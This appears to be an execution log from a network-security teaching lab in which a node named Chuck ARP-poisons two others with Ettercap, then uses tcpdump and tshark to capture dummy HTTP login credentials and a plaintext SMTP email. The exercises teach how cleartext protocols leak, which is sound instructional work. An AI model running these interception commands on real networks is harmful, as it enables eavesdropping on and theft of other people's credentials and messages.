+Command: tcpdump -nn -A -r /tmp/lab01_http.pcap 'tcp port 80' 2>/dev/null | tail -60
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 6: begin HTTP packet capture]
+Node: chuck
+Started: 2026-10-12T08:21:39+02:00
+Ended: 2026-10-12T08:21:39+02:00
+Command: docker exec -d labinf-chuck-1 sh -c sudo -n tcpdump -i eth0 -U -s 0 -w /tmp/lab01_http.pcap host 10.92.2.20 and host 10.92.2.10 and tcp port 80 >/tmp/lab01_http_tcpdump.log 2>&1
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 6: Bob submits dummy HTTP credentials]
+Node: bob
+Started: 2026-10-12T08:21:40+02:00
+Ended: 2026-10-12T08:21:40+02:00
+Command: curl -sS -i -X POST -d 'username=lab01_demo&password=Lab01Demo!' http://10.92.2.10/login.html
+Exit status: 0
+--- stdout ---
+HTTP/1.1 200 OK
+Date: Mon, 12 Oct 2026 06:21:40 GMT
+Server: Apache/2.4.69 (Unix)
+Last-Modified: Fri, 09 Oct 2026 20:36:06 GMT
+ETag: "75d-65d6e4c2bf980"
+Accept-Ranges: bytes
+Content-Length: 1885
+Content-Type: text/html
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Useful Login Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+        }
+        
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        
+        .container h2 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        
+        .form-group button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Useful Login</h2>
+        <form method="post">
+            <div class="form-group">
+                <label for="username">Username:</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <div class="form-group">
+                <button type="submit">Login</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 6: stop HTTP packet capture]
+Node: chuck
+Started: 2026-10-12T08:21:41+02:00
+Ended: 2026-10-12T08:21:41+02:00
+Command: sudo -n pkill -INT -x tcpdump
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 6: inspect captured cleartext HTTP form]
+Node: chuck
+Started: 2026-10-12T08:21:41+02:00
+Ended: 2026-10-12T08:21:42+02:00
+Command: tshark -r /tmp/lab01_http.pcap -Y 'http.request.method == \"POST\"' -T fields -e frame.time_relative -e ip.src -e ip.dst -e http.host -e http.request.uri -e urlencoded-form.key -e urlencoded-form.value
+Exit status: 4
+--- stdout ---
+(empty)
+--- stderr ---
+tshark: "\" was unexpected in this context.
+    http.request.method == \"POST\"
+                           ^
+
+====================================================================================================
+[Exercise 6: inspect captured HTTP payload]
+Node: chuck
+Started: 2026-10-12T08:21:42+02:00
+Ended: 2026-10-12T08:21:42+02:00
+Command: tcpdump -nn -A -r /tmp/lab01_http.pcap 'tcp port 80' 2>/dev/null | tail -60
+Exit status: 0
+--- stdout ---
+\.
+
+\...P..........P...2...
+06:21:40.833424 IP 10.92.2.10.80 > 10.92.2.20.49110: Flags [R], seq 300585692, win 0, length 0
+E..(..@.?.".
+\.
+
+\...P..........P...2...
+06:21:40.835146 IP 10.92.2.20.49110 > 10.92.2.10.80: Flags [.], ack 1450, win 548, options [nop,nop,TS val 170200852 ecr 3723777047], length 0
+E..4..@.@.!.
+\..
+\.
+...P5.s........$.Z.....
+
+%....T.
+06:21:40.835158 IP 10.92.2.10.80 > 10.92.2.20.49110: Flags [R], seq 300585692, win 0, length 0
+E..(..@.@.!.
+\.
+
+\...P..........P...2...
+06:21:40.835160 IP 10.92.2.10.80 > 10.92.2.20.49110: Flags [R], seq 300585692, win 0, length 0
+E..(..@.?.".
+\.
+
+\...P..........P...2...
+06:21:40.835179 IP 10.92.2.10.80 > 10.92.2.20.49110: Flags [R], seq 300587022, win 0, length 0
+E..(..@.@.!.
+\.
+
+\...P..........P...,...
+06:21:40.835200 IP 10.92.2.10.80 > 10.92.2.20.49110: Flags [R], seq 300585691, win 0, length 0
+E..(..@.@.!.
+\.
+
+\...P..........P...2...
+06:21:40.835219 IP 10.92.2.10.80 > 10.92.2.20.49110: Flags [R], seq 300586356, win 0, length 0
+E..(..@.@.!.
+\.
+
+\...P.....t....P.../...
+06:21:40.835239 IP 10.92.2.10.80 > 10.92.2.20.49110: Flags [R], seq 300586356, win 0, length 0
+E..(..@.@.!.
+\.
+
+\...P.....t....P.../...
+06:21:40.835258 IP 10.92.2.20.49110 > 10.92.2.10.80: Flags [R], seq 900559754, win 0, length 0
+E..(..@.@.!.
+\..
+\.
+...P5.s....gP...0E..
+06:21:40.835277 IP 10.92.2.10.80 > 10.92.2.20.49110: Flags [R], seq 300586357, win 0, length 0
+E..(..@.@.!.
+\.
+
+\...P.....u....P.../...
+06:21:40.837055 IP 10.92.2.10.80 > 10.92.2.20.49110: Flags [R], seq 300586357, win 0, length 0
+E..(..@.@.!.
+\.
+
+\...P.....u....P.../...
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: reset neighbor cache before baseline]
+Node: alice
+Started: 2026-10-12T08:24:08+02:00
+Ended: 2026-10-12T08:24:08+02:00
+Command: ip neigh flush all
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: reset neighbor cache before baseline]
+Node: bob
+Started: 2026-10-12T08:24:08+02:00
+Ended: 2026-10-12T08:24:08+02:00
+Command: sudo -n ip neigh flush all
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: reset neighbor cache before baseline]
+Node: chuck
+Started: 2026-10-12T08:24:08+02:00
+Ended: 2026-10-12T08:24:09+02:00
+Command: sudo -n ip neigh flush all
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: baseline ARP table on Alice]
+Node: alice
+Started: 2026-10-12T08:24:09+02:00
+Ended: 2026-10-12T08:24:09+02:00
+Command: ping -c 1 -W 2 10.92.2.20; ping -c 1 -W 2 10.92.2.30; arp -e
+Exit status: 0
+--- stdout ---
+PING 10.92.2.20 (10.92.2.20) 56(84) bytes of data.
+64 bytes from 10.92.2.20: icmp_seq=1 ttl=64 time=0.093 ms
+
+--- 10.92.2.20 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.093/0.093/0.093/0.000 ms
+PING 10.92.2.30 (10.92.2.30) 56(84) bytes of data.
+64 bytes from 10.92.2.30: icmp_seq=1 ttl=64 time=0.061 ms
+
+--- 10.92.2.30 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.061/0.061/0.061/0.000 ms
+Address                  HWtype  HWaddress           Flags Mask            Iface
+labinf-bob-1.labinf_sec  ether   86:e8:5f:bf:03:b0   C                     eth0
+labinf-chuck-1.labinf_s  ether   26:03:4e:24:43:a7   C                     eth0
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: baseline ARP table on Bob]
+Node: bob
+Started: 2026-10-12T08:24:09+02:00
+Ended: 2026-10-12T08:24:09+02:00
+Command: ping -c 1 -W 2 10.92.2.10; ping -c 1 -W 2 10.92.2.30; arp -e
+Exit status: 0
+--- stdout ---
+PING 10.92.2.10 (10.92.2.10) 56(84) bytes of data.
+64 bytes from 10.92.2.10: icmp_seq=1 ttl=64 time=0.055 ms
+
+--- 10.92.2.10 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.055/0.055/0.055/0.000 ms
+PING 10.92.2.30 (10.92.2.30) 56(84) bytes of data.
+64 bytes from 10.92.2.30: icmp_seq=1 ttl=64 time=0.067 ms
+
+--- 10.92.2.30 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.067/0.067/0.067/0.000 ms
+Address                  HWtype  HWaddress           Flags Mask            Iface
+labinf-chuck-1.labinf_s  ether   26:03:4e:24:43:a7   C                     eth0
+labinf-alice-1.labinf_s  ether   f6:cd:44:fd:b5:4a   C                     eth0
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: baseline ARP table on Chuck]
+Node: chuck
+Started: 2026-10-12T08:24:09+02:00
+Ended: 2026-10-12T08:24:09+02:00
+Command: ping -c 1 -W 2 10.92.2.10; ping -c 1 -W 2 10.92.2.20; arp -e
+Exit status: 0
+--- stdout ---
+PING 10.92.2.10 (10.92.2.10) 56(84) bytes of data.
+64 bytes from 10.92.2.10: icmp_seq=1 ttl=64 time=0.068 ms
+
+--- 10.92.2.10 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.068/0.068/0.068/0.000 ms
+PING 10.92.2.20 (10.92.2.20) 56(84) bytes of data.
+64 bytes from 10.92.2.20: icmp_seq=1 ttl=64 time=0.030 ms
+
+--- 10.92.2.20 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.030/0.030/0.030/0.000 ms
+Address                  HWtype  HWaddress           Flags Mask            Iface
+labinf-alice-1.labinf_s  ether   f6:cd:44:fd:b5:4a   C                     eth0
+labinf-bob-1.labinf_sec  ether   86:e8:5f:bf:03:b0   C                     eth0
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: start ARP packet capture]
+Node: chuck
+Started: 2026-10-12T08:24:09+02:00
+Ended: 2026-10-12T08:24:09+02:00
+Command: docker exec -d labinf-chuck-1 sh -c sudo -n tcpdump -i eth0 -U -s 0 -w /tmp/lab01_arp.pcap arp >/tmp/lab01_arp_tcpdump.log 2>&1
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: start handout Ettercap ARP poisoning command]
+Node: chuck
+Started: 2026-10-12T08:24:10+02:00
+Ended: 2026-10-12T08:24:10+02:00
+Command: docker exec -d labinf-chuck-1 sh -c nohup labinf-ettercap -T -q -M arp /10.92.2.10// /10.92.2.20// >/tmp/lab01_ettercap.log 2>&1 </dev/null
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: Ettercap status and victim groups]
+Node: chuck
+Started: 2026-10-12T08:24:13+02:00
+Ended: 2026-10-12T08:24:13+02:00
+Command: cat /tmp/lab01_ettercap.log
+Exit status: 0
+--- stdout ---
+
+[1mettercap 0.8.4.1[0m copyright 2001-2026 Ettercap Development Team
+
+Listening on:
+  eth0 -> 26:03:4E:24:43:A7
+	  10.92.2.30/255.255.255.0
+
+
+This product includes GeoLite2 Data created by MaxMind, available from https://www.maxmind.com/.
+SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
+Privileges dropped to EUID 65534 EGID 65534...
+
+  34 plugins
+  42 protocol dissectors
+  56 ports monitored
+38702 mac vendor fingerprint
+1766 tcp OS fingerprint
+2182 known services
+Lua: no scripts were specified, not starting up!
+
+Scanning for merged targets (2 hosts)...
+
+
+/ |=========================>                         |  50.00 %
+- |==================================================>| 100.00 %
+* |==================================================>| 100.00 %
+
+2 hosts added to the hosts list...
+
+ARP poisoning victims:
+
+ GROUP 1 : 10.92.2.10 F6:CD:44:FD:B5:4A
+
+ GROUP 2 : 10.92.2.20 86:E8:5F:BF:03:B0
+Starting Unified sniffing...
+
+
+Text only Interface activated...
+Hit 'h' for inline help
+
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: verify Chuck forwarding and redirect settings]
+Node: chuck
+Started: 2026-10-12T08:24:13+02:00
+Ended: 2026-10-12T08:24:13+02:00
+Command: sysctl net.ipv4.ip_forward net.ipv4.conf.all.send_redirects net.ipv4.conf.default.send_redirects net.ipv4.conf.eth0.send_redirects
+Exit status: 0
+--- stdout ---
+net.ipv4.ip_forward = 1
+net.ipv4.conf.all.send_redirects = 0
+net.ipv4.conf.default.send_redirects = 0
+net.ipv4.conf.eth0.send_redirects = 0
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: poisoned neighbor table on Bob]
+Node: bob
+Started: 2026-10-12T08:24:13+02:00
+Ended: 2026-10-12T08:24:14+02:00
+Command: ping -c 2 -W 2 10.92.2.10; arp -e
+Exit status: 0
+--- stdout ---
+PING 10.92.2.10 (10.92.2.10) 56(84) bytes of data.
+64 bytes from 10.92.2.10: icmp_seq=1 ttl=63 time=0.072 ms
+64 bytes from 10.92.2.10: icmp_seq=1 ttl=63 time=1.90 ms (DUP!)
+64 bytes from 10.92.2.10: icmp_seq=1 ttl=64 time=1.93 ms (DUP!)
+64 bytes from 10.92.2.10: icmp_seq=1 ttl=64 time=3.84 ms (DUP!)
+64 bytes from 10.92.2.10: icmp_seq=2 ttl=63 time=0.102 ms
+
+--- 10.92.2.10 ping statistics ---
+2 packets transmitted, 2 received, +3 duplicates, 0% packet loss, time 1001ms
+rtt min/avg/max/mdev = 0.072/1.569/3.841/1.399 ms
+Address                  HWtype  HWaddress           Flags Mask            Iface
+labinf-chuck-1.labinf_s  ether   26:03:4e:24:43:a7   C                     eth0
+labinf-alice-1.labinf_s  ether   26:03:4e:24:43:a7   C                     eth0
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: poisoned neighbor table on Alice]
+Node: alice
+Started: 2026-10-12T08:24:14+02:00
+Ended: 2026-10-12T08:24:15+02:00
+Command: ping -c 2 -W 2 10.92.2.20; arp -e
+Exit status: 0
+--- stdout ---
+PING 10.92.2.20 (10.92.2.20) 56(84) bytes of data.
+64 bytes from 10.92.2.20: icmp_seq=1 ttl=63 time=0.071 ms
+64 bytes from 10.92.2.20: icmp_seq=1 ttl=63 time=1.35 ms (DUP!)
+64 bytes from 10.92.2.20: icmp_seq=1 ttl=64 time=1.38 ms (DUP!)
+64 bytes from 10.92.2.20: icmp_seq=1 ttl=64 time=3.29 ms (DUP!)
+64 bytes from 10.92.2.20: icmp_seq=2 ttl=63 time=0.083 ms
+
+--- 10.92.2.20 ping statistics ---
+2 packets transmitted, 2 received, +3 duplicates, 0% packet loss, time 1002ms
+rtt min/avg/max/mdev = 0.071/1.236/3.292/1.178 ms
+Address                  HWtype  HWaddress           Flags Mask            Iface
+labinf-bob-1.labinf_sec  ether   26:03:4e:24:43:a7   C                     eth0
+labinf-chuck-1.labinf_s  ether   26:03:4e:24:43:a7   C                     eth0
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: stop ARP packet capture]
+Node: chuck
+Started: 2026-10-12T08:24:15+02:00
+Ended: 2026-10-12T08:24:15+02:00
+Command: sudo -n pkill -INT -x tcpdump
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: decode captured ARP replies]
+Node: chuck
+Started: 2026-10-12T08:24:16+02:00
+Ended: 2026-10-12T08:24:16+02:00
+Command: tshark -r /tmp/lab01_arp.pcap -Y arp -T fields -e frame.time_relative -e eth.src -e arp.opcode -e arp.src.proto_ipv4 -e arp.src.hw_mac -e arp.dst.proto_ipv4
+Exit status: 0
+--- stdout ---
+0.000000000	26:03:4e:24:43:a7	1	10.92.2.30	26:03:4e:24:43:a7	10.92.2.10
+0.000024000	26:03:4e:24:43:a7	1	10.92.2.30	26:03:4e:24:43:a7	10.92.2.10
+0.000034000	f6:cd:44:fd:b5:4a	2	10.92.2.10	f6:cd:44:fd:b5:4a	10.92.2.30
+0.012287000	26:03:4e:24:43:a7	1	10.92.2.30	26:03:4e:24:43:a7	10.92.2.20
+0.012293000	26:03:4e:24:43:a7	1	10.92.2.30	26:03:4e:24:43:a7	10.92.2.20
+0.012306000	86:e8:5f:bf:03:b0	2	10.92.2.20	86:e8:5f:bf:03:b0	10.92.2.30
+1.025215000	26:03:4e:24:43:a7	2	10.92.2.20	26:03:4e:24:43:a7	10.92.2.10
+1.025225000	26:03:4e:24:43:a7	2	10.92.2.10	26:03:4e:24:43:a7	10.92.2.20
+2.043377000	26:03:4e:24:43:a7	2	10.92.2.20	26:03:4e:24:43:a7	10.92.2.10
+2.043409000	26:03:4e:24:43:a7	2	10.92.2.10	26:03:4e:24:43:a7	10.92.2.20
+3.059425000	26:03:4e:24:43:a7	2	10.92.2.20	26:03:4e:24:43:a7	10.92.2.10
+3.059456000	26:03:4e:24:43:a7	2	10.92.2.10	26:03:4e:24:43:a7	10.92.2.20
+4.073090000	26:03:4e:24:43:a7	2	10.92.2.20	26:03:4e:24:43:a7	10.92.2.10
+4.073111000	26:03:4e:24:43:a7	2	10.92.2.10	26:03:4e:24:43:a7	10.92.2.20
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: close ARP capture status]
+Node: chuck
+Started: 2026-10-12T08:24:16+02:00
+Ended: 2026-10-12T08:24:16+02:00
+Command: cat /tmp/lab01_arp_tcpdump.log
+Exit status: 0
+--- stdout ---
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+14 packets captured
+16 packets received by filter
+0 packets dropped by kernel
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 6: begin HTTP packet capture]
+Node: chuck
+Started: 2026-10-12T08:24:16+02:00
+Ended: 2026-10-12T08:24:17+02:00
+Command: docker exec -d labinf-chuck-1 sh -c sudo -n tcpdump -i eth0 -U -s 0 -w /tmp/lab01_http.pcap host 10.92.2.20 and host 10.92.2.10 and tcp port 80 >/tmp/lab01_http_tcpdump.log 2>&1
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 6: Bob submits dummy HTTP credentials]
+Node: bob
+Started: 2026-10-12T08:24:18+02:00
+Ended: 2026-10-12T08:24:18+02:00
+Command: curl -sS -i -X POST -d 'username=lab01_demo&password=Lab01Demo!' http://10.92.2.10/login.html
+Exit status: 0
+--- stdout ---
+HTTP/1.1 200 OK
+Date: Mon, 12 Oct 2026 06:24:18 GMT
+Server: Apache/2.4.69 (Unix)
+Last-Modified: Fri, 09 Oct 2026 20:36:06 GMT
+ETag: "75d-65d6e4c2bf980"
+Accept-Ranges: bytes
+Content-Length: 1885
+Content-Type: text/html
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Useful Login Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+        }
+        
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        
+        .container h2 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        
+        .form-group button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Useful Login</h2>
+        <form method="post">
+            <div class="form-group">
+                <label for="username">Username:</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <div class="form-group">
+                <button type="submit">Login</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 6: stop HTTP packet capture]
+Node: chuck
+Started: 2026-10-12T08:24:19+02:00
+Ended: 2026-10-12T08:24:19+02:00
+Command: sudo -n pkill -INT -x tcpdump
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 6: decode captured HTTP POST fields]
+Node: chuck
+Started: 2026-10-12T08:24:20+02:00
+Ended: 2026-10-12T08:24:20+02:00
+Command: tshark -r /tmp/lab01_http.pcap -Y http.request.method -T fields -e frame.time_relative -e ip.src -e ip.dst -e http.request.method -e http.host -e http.request.uri -e urlencoded-form.key -e urlencoded-form.value
+Exit status: 0
+--- stdout ---
+0.000069000	10.92.2.20	10.92.2.10	POST	10.92.2.10	/login.html	username,password	lab01_demo,Lab01Demo!
+0.000491000	10.92.2.20	10.92.2.10	POST	10.92.2.10	/login.html	username,password	lab01_demo,Lab01Demo!
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 6: show cleartext HTTP packet body]
+Node: chuck
+Started: 2026-10-12T08:24:20+02:00
+Ended: 2026-10-12T08:24:20+02:00
+Command: sudo -n tcpdump -nn -A -r /tmp/lab01_http.pcap 'tcp port 80' 2>/dev/null | grep -A6 -B3 'username=lab01_demo'
+Exit status: 0
+--- stdout ---
+Content-Length: 39
+Content-Type: application/x-www-form-urlencoded
+
+username=lab01_demo&password=Lab01Demo!
+06:24:18.093836 IP 10.92.2.20.39310 > 10.92.2.10.80: Flags [P.], seq 1:194, ack 1, win 502, options [nop,nop,TS val 170358117 ecr 3723934313], length 193: HTTP: POST /login.html HTTP/1.1
+E...f.@.?..I
+\..
+\.
+...P..;................
+
+--
+Content-Length: 39
+Content-Type: application/x-www-form-urlencoded
+
+username=lab01_demo&password=Lab01Demo!
+06:24:18.093865 IP 10.92.2.10.80 > 10.92.2.20.39310: Flags [.], ack 194, win 508, options [nop,nop,TS val 3723934313 ecr 170358117], length 0
+E..4:.@.@...
+\.
+
+\...P........<............
+...i
+--
+Content-Length: 39
+Content-Type: application/x-www-form-urlencoded
+
+username=lab01_demo&password=Lab01Demo!
+06:24:18.094266 IP 10.92.2.20.39310 > 10.92.2.10.80: Flags [.], ack 2115, win 548, options [nop,nop,TS val 170358118 ecr 3723934314], length 0
+E..4f.@.@...
+\..
+\.
+...P..<........$.......
+
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 6: packet capture summary]
+Node: chuck
+Started: 2026-10-12T08:24:20+02:00
+Ended: 2026-10-12T08:24:20+02:00
+Command: cat /tmp/lab01_http_tcpdump.log; ls -lh /tmp/lab01_http.pcap
+Exit status: 0
+--- stdout ---
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+58 packets captured
+58 packets received by filter
+0 packets dropped by kernel
+-rw-r--r-- 1 tcpdump tcpdump 9.8K Oct 12 06:24 /tmp/lab01_http.pcap
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 7: begin SMTP packet capture]
+Node: chuck
+Started: 2026-10-12T08:24:20+02:00
+Ended: 2026-10-12T08:24:20+02:00
+Command: docker exec -d labinf-chuck-1 sh -c sudo -n tcpdump -i eth0 -U -s 0 -w /tmp/lab01_smtp.pcap host 10.92.2.20 and host 10.92.2.10 and tcp port 25 >/tmp/lab01_smtp_tcpdump.log 2>&1
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 7: Bob sends plaintext SMTP message with s-nail]
+Node: bob
+Started: 2026-10-12T08:24:21+02:00
+Ended: 2026-10-12T08:24:21+02:00
+Command: s-nail -S 'mta=smtp://10.92.2.10' -S 'from=bob@kali' -s 'Esame di Sicurezza' alice@kali
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+s-nail: Obsoletion warning: Use of old-style credentials, which will vanish in v15!
+s-nail:   Please read the manual section "On URL syntax and credential lookup"
+
+====================================================================================================
+[Exercise 7: stop SMTP packet capture]
+Node: chuck
+Started: 2026-10-12T08:24:23+02:00
+Ended: 2026-10-12T08:24:23+02:00
+Command: sudo -n pkill -INT -x tcpdump
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 7: Alice reads received mailbox]
+Node: alice
+Started: 2026-10-12T08:24:24+02:00
+Ended: 2026-10-12T08:24:25+02:00
+Command: cat /var/mail/alice
+Exit status: 0
+--- stdout ---
+From bob@kali Mon Oct 12 06:24:21 2026
+Return-path: <bob@kali>
+Envelope-to: alice@kali
+Delivery-date: Mon, 12 Oct 2026 06:24:21 +0000
+Received: from labinf-bob-1.labinf_secnet ([10.92.2.20] helo=510de8c25c46)
+	by 220e90e7b2e2 with smtp (Exim 4.98.2)
+	(envelope-from <bob@kali>)
+	id 1xG9SP-000000000Dd-0a9B
+	for alice@kali;
+	Mon, 12 Oct 2026 06:24:21 +0000
+Date: Mon, 12 Oct 2026 06:24:21 +0000
+From: bob@kali
+To: alice@kali
+Subject: Esame di Sicurezza
+Message-ID: <20261012062421.fsvb_%bob@kali>
+User-Agent: s-nail v14.9.25
+
+Ho bisogno di un voto maggiore di 27, il numero della mia carta di credito e' 7865-8993-6282-8282. Faccia lei il prezzo!
+
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 7: show captured plaintext SMTP payload]
+Node: chuck
+Started: 2026-10-12T08:24:25+02:00
+Ended: 2026-10-12T08:24:25+02:00
+Command: sudo -n tcpdump -nn -A -r /tmp/lab01_smtp.pcap 'tcp port 25' 2>/dev/null | grep -A20 -B5 'carta di credito'
+Exit status: 0
+--- stdout ---
+To: alice@kali
+Subject: Esame di Sicurezza
+Message-ID: <20261012062421.fsvb_%bob@kali>
+User-Agent: s-nail v14.9.25
+
+Ho bisogno di un voto maggiore di 27, il numero della mia carta di credito e' 7865-8993-6282-8282. Faccia lei il prezzo!
+.
+
+06:24:21.678329 IP 10.92.2.20.45832 > 10.92.2.10.25: Flags [P.], seq 109:371, ack 211, win 502, options [nop,nop,TS val 170361702 ecr 3723937898], length 262: SMTP: From: bob@kali
+E..:-.@.?...
+\..
+\.
+...._...l,.............
+
+'.f...jFrom: bob@kali
+To: alice@kali
+Subject: Esame di Sicurezza
+Message-ID: <20261012062421.fsvb_%bob@kali>
+User-Agent: s-nail v14.9.25
+
+Ho bisogno di un voto maggiore di 27, il numero della mia carta di credito e' 7865-8993-6282-8282. Faccia lei il prezzo!
+.
+
+06:24:21.678342 IP 10.92.2.10.25 > 10.92.2.20.45832: Flags [.], ack 371, win 508, options [nop,nop,TS val 3723937898 ecr 170361702], length 0
+E..4..@.@..G
+\.
+
+\......l,.._..............
+...j
+'.f
+06:24:21.678343 IP 10.92.2.10.25 > 10.92.2.20.45832: Flags [.], ack 371, win 508, options [nop,nop,TS val 3723937898 ecr 170361702], length 0
+E..4..@.?..G
+\.
+
+\......l,.._..............
+...j
+'.f
+06:24:21.680170 IP 10.92.2.10.25 > 10.92.2.20.45832: Flags [.], ack 109, win 510, options [nop,nop,TS val 3723937898 ecr 170361661], length 0
+E..4..@.@..H
+\.
+
+--
+To: alice@kali
+Subject: Esame di Sicurezza
+Message-ID: <20261012062421.fsvb_%bob@kali>
+User-Agent: s-nail v14.9.25
+
+Ho bisogno di un voto maggiore di 27, il numero della mia carta di credito e' 7865-8993-6282-8282. Faccia lei il prezzo!
+.
+
+06:24:21.680219 IP 10.92.2.10.25 > 10.92.2.20.45832: Flags [.], ack 371, win 508, options [nop,nop,TS val 3723937898 ecr 170361702], length 0
+E..4..@.@..G
+\.
+
+\......l,.._..............
+...j
+'.f
+06:24:21.683582 IP 10.92.2.10.25 > 10.92.2.20.45832: Flags [P.], seq 211:246, ack 371, win 508, options [nop,nop,TS val 3723937903 ecr 170361702], length 35: SMTP: 250 OK id=1xG9SP-000000000Dd-0a9B
+E..W..@.@..#
+\.
+
+\......l,.._..............
+...o
+'.f250 OK id=1xG9SP-000000000Dd-0a9B
+
+06:24:21.683585 IP 10.92.2.10.25 > 10.92.2.20.45832: Flags [P.], seq 211:246, ack 371, win 508, options [nop,nop,TS val 3723937903 ecr 170361702], length 35: SMTP: 250 OK id=1xG9SP-000000000Dd-0a9B
+E..W..@.?..#
+\.
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 7: SMTP capture summary]
+Node: chuck
+Started: 2026-10-12T08:24:25+02:00
+Ended: 2026-10-12T08:24:25+02:00
+Command: cat /tmp/lab01_smtp_tcpdump.log; ls -lh /tmp/lab01_smtp.pcap
+Exit status: 0
+--- stdout ---
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+72 packets captured
+72 packets received by filter
+0 packets dropped by kernel
+-rw-r--r-- 1 tcpdump tcpdump 7.8K Oct 12 06:24 /tmp/lab01_smtp.pcap
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 8: begin SSH packet capture]
+Node: chuck
+Started: 2026-10-12T08:24:25+02:00
+Ended: 2026-10-12T08:24:25+02:00
+Command: docker exec -d labinf-chuck-1 sh -c sudo -n tcpdump -i eth0 -U -s 0 -w /tmp/lab01_ssh.pcap host 10.92.2.20 and host 10.92.2.10 and tcp port 22 >/tmp/lab01_ssh_tcpdump.log 2>&1
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
